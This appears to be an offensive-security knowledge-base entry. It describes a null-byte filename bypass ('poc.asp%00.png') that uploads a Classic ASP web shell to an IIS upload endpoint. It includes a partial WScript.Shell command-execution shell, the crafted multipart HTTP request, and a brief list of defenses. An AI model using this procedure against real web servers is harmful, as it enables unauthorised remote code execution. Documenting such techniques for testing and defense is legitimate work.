---
tags:
  - file-upload
  - null-byte
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.319Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 2e79ba23-464d-421b-b303-674774a83a4f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-ASP-File-with-Null-Byte

## Summary

This procedure exploits improper file extension validation in a web application's repository endpoint by using a null byte (%00) to truncate the filename, allowing upload of a malicious ASP script disguised as a safe PNG file, leading to potential RCE.

## Description

The target is a DoD web app running on IIS with Classic ASP. The endpoint /repo/orbital/repo.asp?fileToUpload=pizza.asp processes uploads but fails to sanitize null bytes, treating 'poc.asp%00.png' as 'poc.asp' for execution. The uploaded ASP contains code to create a command execution interface via the 'cmd' parameter.

## Requirements

1. Access to the vulnerable upload endpoint (e.g., /repo/orbital/repo.asp)
2. [[tools/Burp-Suite]] for intercepting and modifying multipart/form-data requests
3. Malicious ASP payload ready (e.g., shell code for command output)

## Defense

Defensive measures and detection strategies:

- Validate file extensions server-side without relying on truncation-prone methods
- Sanitize inputs to remove null bytes and other control characters
- Scan uploaded files with antivirus and restrict executable types (e.g., block .asp)

## Objectives

1. Bypass file type restrictions to upload executable scripts
2. Place malicious file in a web-accessible directory
3. Enable subsequent RCE through the uploaded shell

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Prepare the ASP shell code that handles command execution using Request and Response objects.

**Command** (Payload content):

Embed ASP code like: <%@ Language=VBScript %><% Response.ContentType = "text/html" sub getCommandOutput(szCMD) dim objShell set objShell = CreateObject("WScript.Shell") set objExec = objShell.Exec(szCMD) ... %>

> This creates a function to run commands passed via ?cmd= and output results.

### Step 2: Intercept and Modify Upload Request

**Context**: Use Burp Suite to alter the filename with null byte and send the POST request.

**Command** (HTTP Request via Burp):
```http
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="fileToUpload"; filename="poc.asp%00.png"
Content-Type: image/png

[ASP Shell Code Here]
------WebKitFormBoundary--
```

> Send the request; success indicated by 200 OK and file placement in /savefiles/.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[file-upload]]
- [[null-byte]]
- [[bypass]]
